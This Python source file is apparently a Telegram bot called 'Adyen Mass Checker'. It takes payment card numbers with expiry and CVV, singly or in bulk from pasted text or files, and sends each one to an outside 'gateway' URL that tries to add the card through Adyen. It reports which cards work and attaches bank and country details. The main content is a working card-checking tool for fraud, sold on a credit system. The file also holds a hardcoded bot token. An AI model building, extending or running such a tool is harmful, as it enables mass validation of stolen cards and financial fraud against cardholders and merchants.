import telebot
from telebot import types
import requests
import time
from datetime import datetime
import re
import urllib.parse
import logging
import threading
import os
import json
from collections import defaultdict

# ============= BOT TOKEN =============
BOT_TOKEN = "8605254644:AAGTCIJxofpWNyy36tfA028wv6gFB_WdJHE"
ADMIN_ID = 7904483885

# ============= SETTINGS =============
MAX_THREADS = 3
API_TIMEOUT = 30
DEFAULT_CREDITS = 100
CREDITS_PER_CHECK = 1

# ============= STORAGE =============
user_credits = {}
user_last_reset = {}
banned_users = set()
mass_tasks = {}

# ============= GATEWAY =============
GATEWAY_URL = 'https://onyxenvbot.up.railway.app/adyen/key=yashikaaa/cc='

# ============= LOGGING =============
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============= BOT INIT =============
bot = telebot.TeleBot(BOT_TOKEN)

# ============= FILE FUNCTIONS =============
def load_data():
    global user_credits, user_last_reset, banned_users
    try:
        with open('credits.json', 'r') as f:
            data = json.load(f)
            user_credits = data.get('credits', {})
            user_last_reset = data.get('last_reset', {})
    except:
        user_credits = {}
        user_last_reset = {}
    
    try:
        with open('banned.json', 'r') as f:
            banned_users = set(json.load(f))
    except:
        banned_users = set()

def save_data():
    with open('credits.json', 'w') as f:
        json.dump({'credits': user_credits, 'last_reset': user_last_reset}, f)
    with open('banned.json', 'w') as f:
        json.dump(list(banned_users), f)

load_data()

# ============= CREDIT FUNCTIONS =============
def get_credits(user_id):
    uid = str(user_id)
    now = time.time()
    last = user_last_reset.get(uid, 0)
    
    if now - last >= 3600:
        user_credits[uid] = DEFAULT_CREDITS
        user_last_reset[uid] = now
        save_data()
    
    return user_credits.get(uid, DEFAULT_CREDITS)

def use_credit(user_id):
    uid = str(user_id)
    now = time.time()
    last = user_last_reset.get(uid, 0)
    
    if now - last >= 3600:
        user_credits[uid] = DEFAULT_CREDITS
        user_last_reset[uid] = now
    
    if user_credits.get(uid, 0) >= CREDITS_PER_CHECK:
        user_credits[uid] -= CREDITS_PER_CHECK
        save_data()
        return True
    return False

def add_credits(user_id, amount):
    uid = str(user_id)
    user_credits[uid] = get_credits(user_id) + amount
    save_data()

# ============= HELPERS =============
def extract_cards(text):
    return re.findall(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', text)

def get_bin_info(bin_num):
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin_num[:6]}", timeout=5)
        return r.json() if r.status_code == 200 else {}
    except:
        return {}

def check_card(card):
    try:
        start = time.time()
        r = requests.get(GATEWAY_URL + urllib.parse.quote(card), timeout=API_TIMEOUT)
        elapsed = time.time() - start
        
        if r.status_code == 200:
            data = r.json()
            return {'card': card, 'success': True, 'data': data, 'time': elapsed}
        return {'card': card, 'success': False, 'error': f'HTTP {r.status_code}'}
    except Exception as e:
        return {'card': card, 'success': False, 'error': str(e)[:50]}

# ============= BOT COMMANDS =============
@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    
    if uid in banned_users:
        bot.reply_to(message, "🚫 You are banned. Contact @lost_yashika")
        return
    
    credits = get_credits(uid)
    
    text = f"""<b>✨ Adyen Mass Checker ✨</b>

┌───⊷ <b>USER</b>
├ 👤 {message.from_user.first_name}
├ 🆔 <code>{uid}</code>
└ 💰 Credits: <code>{credits}</code>

┌───⊷ <b>BOT</b>
├ ⚡ Gateway: Adyen Auth
├ 💰 Cost: 1 credit/check
└ 🔄 Reset: Every hour

┌───⊷ <b>COMMANDS</b>
├ /ady CC|MM|YY|CVV
├ /tady [cards or .txt]
├ /credits
├ /stop
└ /info

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
    
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['ady'])
def single_check(message):
    uid = message.from_user.id
    
    if uid in banned_users:
        bot.reply_to(message, "🚫 Banned")
        return
    
    if not use_credit(uid):
        credits = get_credits(uid)
        bot.reply_to(message,
            f"<b>⚠️ Insufficient Credits!</b>\n\n"
            f"Your credits: {credits}\n"
            f"Need: 1 credit\n\n"
            f"Contact @lost_yashika for free credits\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/ady 4111111111111111|12|26|123`", parse_mode='Markdown')
        return
    
    card = parts[1]
    if not re.match(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', card):
        bot.reply_to(message, "Invalid format! Use: `CC|MM|YY|CVV`", parse_mode='Markdown')
        return
    
    msg = bot.reply_to(message, "⚡ Checking...")
    result = check_card(card)
    
    if result['success']:
        bin_info = get_bin_info(card.split('|')[0])
        status = result['data'].get('status', 'Unknown')
        response_text = result['data'].get('response', '')
        
        if 'approved' in status.lower() or 'card_added' in response_text.lower():
            emoji = "✅"
            status_text = "CARD ADDED"
        elif 'declined' in status.lower():
            emoji = "❌"
            status_text = "DECLINED"
        else:
            emoji = "⚠️"
            status_text = status.upper()
        
        remaining = get_credits(uid)
        
        text = f"""<b>{emoji} {status_text}</b>

┌───⊷ <b>CARD</b>
├ 💳 <code>{card}</code>
├ 🌐 Gateway: Adyen Auth
└ 📝 Response: {response_text[:50]}

┌───⊷ <b>BIN INFO</b>
├ 🏦 {bin_info.get('bank', 'Unknown')}
├ 💳 {bin_info.get('brand', 'Unknown')}
└ 🌍 {bin_info.get('country_name', 'Unknown')}

┌───⊷ <b>STATS</b>
├ ⏱ {result['time']:.2f}s
└ 💰 Credits Left: {remaining}

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
        
        bot.edit_message_text(text, message.chat.id, msg.message_id, parse_mode='HTML')
    else:
        bot.edit_message_text(f"⚠️ Error: {result.get('error')}\n\n━━━━━━━━━━━━━━━━\n<i>Checked by @Toenv</i>\n<i>Dev @Toenv</i>", 
                            message.chat.id, msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['tady'])
def mass_check(message):
    uid = message.from_user.id
    chat_id = message.chat.id
    
    if uid in banned_users:
        bot.reply_to(message, "🚫 Banned")
        return
    
    # Extract cards
    cards_text = ""
    if message.reply_to_message:
        if message.reply_to_message.document:
            file = bot.get_file(message.reply_to_message.document.file_id)
            cards_text = bot.download_file(file.file_path).decode('utf-8')
        else:
            cards_text = message.reply_to_message.text
    else:
        cards_text = message.text.replace('/tady', '').strip()
    
    cards = extract_cards(cards_text)
    
    if not cards:
        bot.reply_to(message, "No cards found! Send as: `CC|MM|YY|CVV`", parse_mode='Markdown')
        return
    
    # Check credits
    needed = len(cards)
    current = get_credits(uid)
    
    if current < needed:
        bot.reply_to(message,
            f"<b>⚠️ Insufficient Credits!</b>\n\n"
            f"Cards: {len(cards)}\n"
            f"Need: {needed} credits\n"
            f"Your credits: {current}\n"
            f"Shortage: {needed - current}\n\n"
            f"Get credits from @lost_yashika\n"
            f"Then use /continue to process\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<i>Checked by @Toenv</i>\n"
            f"<i>Dev @Toenv</i>",
            parse_mode='HTML')
        return
    
    # Deduct credits
    for _ in range(len(cards)):
        use_credit(uid)
    
    # Start mass check
    mass_tasks[chat_id] = {
        'cards': cards,
        'current': 0,
        'approved': 0,
        'declined': 0,
        'error': 0,
        'stop': False,
        'total': len(cards)
    }
    
    msg = bot.reply_to(message,
        f"<b>📦 Mass Check Started</b>\n\n"
        f"Total: {len(cards)} cards\n"
        f"Threads: {MAX_THREADS}x\n\n"
        f"✅ Approved: 0\n"
        f"❌ Declined: 0\n"
        f"⚠️ Error: 0\n\n"
        f"Progress: 0/{len(cards)}\n\n"
        f"Use /stop to stop\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<i>Checked by @Toenv</i>\n"
        f"<i>Dev @Toenv</i>",
        parse_mode='HTML')
    
    mass_tasks[chat_id]['msg_id'] = msg.message_id
    
    # Process
    def process():
        task = mass_tasks.get(chat_id)
        if not task:
            return
        
        total = task['total']
        cards = task['cards']
        
        for i, card in enumerate(cards):
            if task.get('stop'):
                break
            
            result = check_card(card)
            task['current'] += 1
            
            if result['success']:
                status = result['data'].get('status', '').lower()
                response_text = result['data'].get('response', '').lower()
                
                if 'approved' in status or 'card_added' in response_text:
                    task['approved'] += 1
                    # Send approved card
                    bin_info = get_bin_info(card.split('|')[0])
                    text = f"""<b>✅ CARD ADDED</b>

┌───⊷ <b>CARD</b>
├ 💳 <code>{card}</code>
├ 🌐 Gateway: Adyen Auth
└ 📝 Response: {result['data'].get('response', 'Success')[:50]}

┌───⊷ <b>BIN</b>
├ 🏦 {bin_info.get('bank', 'Unknown')}
├ 💳 {bin_info.get('brand', 'Unknown')}
└ 🌍 {bin_info.get('country_name', 'Unknown')}

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
                    bot.send_message(chat_id, text, parse_mode='HTML')
                elif 'declined' in status:
                    task['declined'] += 1
                else:
                    task['error'] += 1
            else:
                task['error'] += 1
            
            # Update status every 3 cards
            if task['current'] % 3 == 0 or task['current'] == total:
                try:
                    status_text = f"""<b>📦 Mass Check in Progress</b>

✅ Approved: {task['approved']}
❌ Declined: {task['declined']}
⚠️ Error: {task['error']}
📊 Progress: {task['current']}/{total}

Use /stop to stop

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
                    bot.edit_message_text(status_text, chat_id, task['msg_id'], parse_mode='HTML')
                except:
                    pass
            
            time.sleep(0.5)
        
        # Final
        final = f"""<b>📦 Mass Check {'Stopped' if task.get('stop') else 'Completed'}</b>

✅ Approved: {task['approved']}
❌ Declined: {task['declined']}
⚠️ Error: {task['error']}
📊 Total: {total}

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
        
        try:
            bot.edit_message_text(final, chat_id, task['msg_id'], parse_mode='HTML')
        except:
            pass
        
        del mass_tasks[chat_id]
    
    threading.Thread(target=process, daemon=True).start()

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    chat_id = message.chat.id
    if chat_id in mass_tasks:
        mass_tasks[chat_id]['stop'] = True
        bot.reply_to(message, "🛑 Stopping mass check...")
    else:
        bot.reply_to(message, "ℹ️ No active mass check")

@bot.message_handler(commands=['credits'])
def credits_cmd(message):
    credits = get_credits(message.from_user.id)
    bot.reply_to(message,
        f"<b>💰 Your Credits: {credits}</b>\n\n"
        f"Get free credits:\n"
        f"• Send bot to channel → 2000 credits\n"
        f"• Invite friend → 200 credits\n"
        f"Contact @lost_yashika\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<i>Checked by @Toenv</i>\n"
        f"<i>Dev @Toenv</i>",
        parse_mode='HTML')

@bot.message_handler(commands=['info'])
def info_cmd(message):
    credits = get_credits(message.from_user.id)
    text = f"""<b>📊 Your Info</b>

👤 Name: {message.from_user.first_name}
📛 Username: @{message.from_user.username or 'None'}
🆔 ID: <code>{message.from_user.id}</code>
💰 Credits: {credits}

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['continue'])
def continue_cmd(message):
    bot.reply_to(message, "Get credits from @lost_yashika and send /tady again")

# ============= ADMIN COMMANDS =============
@bot.message_handler(commands=['ban'])
def ban_cmd(message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /ban <user_id>")
        return
    try:
        uid = int(parts[1])
        banned_users.add(uid)
        save_data()
        bot.reply_to(message, f"✅ Banned {uid}")
    except:
        bot.reply_to(message, "Invalid ID")

@bot.message_handler(commands=['unban'])
def unban_cmd(message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /unban <user_id>")
        return
    try:
        uid = int(parts[1])
        banned_users.discard(uid)
        save_data()
        bot.reply_to(message, f"✅ Unbanned {uid}")
    except:
        bot.reply_to(message, "Invalid ID")

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    if message.from_user.id != ADMIN_ID:
        return
    text = f"""<b>📊 Bot Stats</b>

Users: {len(user_credits)}
Active Mass: {len(mass_tasks)}
Banned: {len(banned_users)}

━━━━━━━━━━━━━━━━
<i>Checked by @Toenv</i>
<i>Dev @Toenv</i>"""
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['addcr'])
def add_cr_cmd(message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /addcr <user_id> <amount>")
        return
    try:
        uid = int(parts[1])
        amt = int(parts[2])
        add_credits(uid, amt)
        bot.reply_to(message, f"✅ Added {amt} credits to {uid}")
    except:
        bot.reply_to(message, "Error")

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(message):
    if message.from_user.id != ADMIN_ID:
        return
    if not message.reply_to_message:
        bot.reply_to(message, "Reply to a message to broadcast")
        return
    text = message.reply_to_message.text
    sent = 0
    for uid in user_credits.keys():
        try:
            bot.send_message(int(uid), f"📢 Broadcast\n\n{text}\n\n━━━━━━━━━━━━━━━━\n<i>Checked by @Toenv</i>\n<i>Dev @Toenv</i>", parse_mode='HTML')
            sent += 1
            time.sleep(0.05)
        except:
            pass
    bot.reply_to(message, f"✅ Sent to {sent} users")

# ============= START BOT =============
if __name__ == "__main__":
    print("🚀 Bot Started!")
    print(f"👑 Admin: {ADMIN_ID}")
    
    # Remove webhook and start
    bot.remove_webhook()
    
    # Simple polling
    bot.infinity_polling(timeout=60)
